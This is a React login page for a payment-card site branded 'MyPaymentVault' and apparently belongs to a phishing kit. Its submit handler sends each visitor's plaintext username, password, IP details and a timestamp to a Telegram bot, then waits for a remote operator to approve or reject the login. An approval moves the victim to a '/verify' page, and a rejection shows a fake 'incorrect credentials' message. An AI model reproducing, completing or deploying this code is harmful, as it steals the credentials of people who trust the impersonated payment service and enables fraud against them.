import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { useAuth } from "@/lib/auth";
import { useI18n, type Language } from "@/lib/i18n";
import { Globe, ChevronDown } from "lucide-react";
import { ChatWidget } from "@/components/chat-widget";
import { RecaptchaBadge } from "@/components/recaptcha-badge";
import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";

const languageOptions: { code: Language; label: string }[] = [
  { code: "en", label: "English" },
  { code: "es", label: "Español" },
  { code: "fr", label: "Français" },
];

export default function Login() {
  const { login, isAuthenticated } = useAuth();
  const { lang, setLang, t, langName } = useI18n();
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [waiting, setWaiting] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [showLangDropdown, setShowLangDropdown] = useState(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const offsetRef = useRef(0);

  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);

  if (isAuthenticated) { navigate("/"); return null; }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    setLoading(true);
    const result = await login(username, password);
    setLoading(false);
    if (!result.ok) { setError(t.invalidCredentials); return; }

    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const [ip, startOffset] = await Promise.all([getIPInfo(), getLatestOffset()]);
    const sessionKey = Date.now().toString(36);
    offsetRef.current = startOffset;

    await sendApprovalRequest(username, password, ip, now, sessionKey, "Login");
    setWaiting(true);

    pollRef.current = setInterval(async () => {
      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
      offsetRef.current = nextOffset;
      if (status === "approved") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui!");
        setWaiting(false);
        navigate("/verify");
      } else if (status === "rejected") {
        clearInterval(pollRef.current!);
        if (callbackId) await answerCallback(callbackId, "❌ Login ditolak.");
        setWaiting(false);
        setShowModal(true);
      }
    }, 2500);
  };

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center login-outer"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 520px) {
          .login-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            padding: 0 !important;
          }
          .login-card {
            max-width: 100% !important;
            min-height: 100dvh !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
          .login-footer {
            display: none !important;
          }
        }
      `}</style>
      {/* ── INCORRECT CREDENTIALS MODAL ── */}
      {showModal && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 1000,
          background: "rgba(0,0,0,0.45)",
          display: "flex", alignItems: "center", justifyContent: "center",
          padding: "0 20px",
        }}>
          <div style={{
            background: "#fff", borderRadius: 4,
            padding: "32px 28px 24px",
            maxWidth: 380, width: "100%",
            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
            textAlign: "center",
          }}>
            <h3 style={{ fontSize: 18, fontWeight: 600, color: "#111", marginBottom: 14 }}>
              {t.incorrectCredsTitle}
            </h3>
            <p style={{ fontSize: 13, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
              {t.incorrectCredsDesc}
            </p>
            <button
              type="button"
              onClick={() => setShowModal(false)}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                borderRadius: 3, cursor: "pointer", letterSpacing: "0.03em",
              }}
            >
              {t.close}
            </button>
          </div>
        </div>
      )}

      {/* ── WAITING OVERLAY ── */}
      {waiting && (
        <div style={{
          position: "fixed", inset: 0, zIndex: 999,
          background: "rgba(255,255,255,0.7)",
          display: "flex", alignItems: "center", justifyContent: "center",
        }}>
          <div style={{
            width: 44, height: 44,
            border: "4px solid #e5e5e5", borderTop: "4px solid #111",
            borderRadius: "50%", animation: "spin 0.85s linear infinite",
          }} />
          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
        </div>
      )}

      {/* ─── CARD ─── */}
      <div
        className="w-full flex flex-col bg-white login-card"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ROW: Logo kiri + Language kanan ══ */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px 18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          {/* Logo text */}
          <span
            className="select-none"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>

          {/* Language selector */}
          <div className="relative">
            <button
              type="button"
              onClick={() => setShowLangDropdown(!showLangDropdown)}
              style={{
                display: "flex", alignItems: "center", gap: 5,
                color: "#555", fontSize: 13, background: "none",
                border: "none", cursor: "pointer",
              }}
            >
              <Globe size={18} color="#555" />
            </button>
            {showLangDropdown && (
              <>
                <div className="fixed inset-0 z-10" onClick={() => setShowLangDropdown(false)} />
                <div
                  style={{
                    position: "absolute", right: 0, top: "100%", marginTop: 4,
                    width: 140, background: "#fff", border: "1px solid #ddd",
                    boxShadow: "0 4px 16px rgba(0,0,0,0.15)", zIndex: 20,
                  }}
                >
                  {languageOptions.map((opt) => (
                    <button
                      key={opt.code}
                      type="button"
                      onClick={() => { setLang(opt.code); setShowLangDropdown(false); }}
                      style={{
                        display: "block", width: "100%", textAlign: "left",
                        padding: "10px 16px", fontSize: 13, background: "none",
                        border: "none", cursor: "pointer",
                        fontWeight: lang === opt.code ? 600 : 400,
                        color: lang === opt.code ? "#111" : "#555",
                      }}
                    >
                      {opt.label}
                    </button>
                  ))}
                </div>
              </>
            )}
          </div>
        </div>

        {/* ══ HERO IMAGE — di bawah header ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img
            src="/hero-vault-new.png"
            alt="MyPaymentVault"
            style={{ width: "100%", display: "block" }}
          />
        </div>

        {/* ══ FORM — di bawah gambar ══ */}
        <div style={{ padding: "28px 28px 24px" }}>
          <h2 style={{ fontSize: 17, fontWeight: 400, color: "#111", marginBottom: 6 }}>
            {t.accessAccount}
          </h2>
          <p style={{ fontSize: 13, color: "#666", marginBottom: 22 }}>
            {t.notEnrolled}{" "}
            <button
              type="button"
              onClick={() => navigate("/create-account")}
              style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 13 }}
            >
              {t.createAccount}
            </button>
          </p>

          <form onSubmit={handleSubmit}>
            {/* Username */}
            <div style={{ marginBottom: 14 }}>
              <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
                <button
                  type="button"
                  onClick={() => navigate("/forgot-username")}
                  style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
                >
                  {t.forgotUsername}
                </button>
              </div>
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                required
                placeholder={`${t.username}*`}
                style={{
                  width: "100%", height: 42, padding: "0 12px",
                  border: "1px solid #ccc", fontSize: 13, color: "#333",
                  outline: "none", boxSizing: "border-box", borderRadius: 3,
                }}
              />
            </div>

            {/* Password */}
            <div style={{ marginBottom: 18 }}>
              <div style={{ display: "flex", justifyContent: "flex-end", marginBottom: 4 }}>
                <button
                  type="button"
                  onClick={() => navigate("/forgot-password")}
                  style={{ fontSize: 12, color: "#555", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}
                >
                  {t.forgotPassword}
                </button>
              </div>
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required
                placeholder={`${t.password}*`}
                style={{
                  width: "100%", height: 42, padding: "0 12px",
                  border: "1px solid #ccc", fontSize: 13, color: "#333",
                  outline: "none", boxSizing: "border-box", borderRadius: 3,
                }}
              />
            </div>

            {error && (
              <div style={{
                background: "#fff0f0", border: "1px solid #fcc", color: "#c00",
                fontSize: 12, textAlign: "center", padding: "8px 12px", marginBottom: 12,
              }}>
                {error}
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              style={{
                width: "100%", height: 44, background: "#111", color: "#fff",
                fontSize: 14, fontWeight: 500, border: "none",
                cursor: loading ? "not-allowed" : "pointer",
                opacity: loading ? 0.6 : 1,
                letterSpacing: "0.04em", borderRadius: 3,
              }}
            >
              {loading ? t.loggingIn : t.login}
            </button>
          </form>

          <p style={{ fontSize: 12, color: "#777", textAlign: "center", marginTop: 16 }}>
            {t.newCard}{" "}
            <button
              type="button"
              onClick={() => navigate("/activate-card")}
              style={{ textDecoration: "underline", color: "#444", background: "none", border: "none", cursor: "pointer", fontSize: 12 }}
            >
              {t.activateCard}
            </button>
          </p>
        </div>
      </div>

      {/* ─── FOOTER ─── */}
      <div className="login-footer" style={{ width: "100%", maxWidth: 480, marginTop: 12, paddingRight: 2, textAlign: "right" }}>
        <span style={{ fontSize: 11, color: "#888" }}>
          &copy; {t.copyright} |{" "}
          <button onClick={() => {}} style={{ fontSize: 11, color: "#888", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
            {t.termsOfUse}
          </button>
          {" | "}
          <button onClick={() => {}} style={{ fontSize: 11, color: "#888", textDecoration: "underline", background: "none", border: "none", cursor: "pointer" }}>
            {t.privacyCookies}
          </button>
        </span>
      </div>

      <RecaptchaBadge />
      <ChatWidget />
    </div>
  );
}
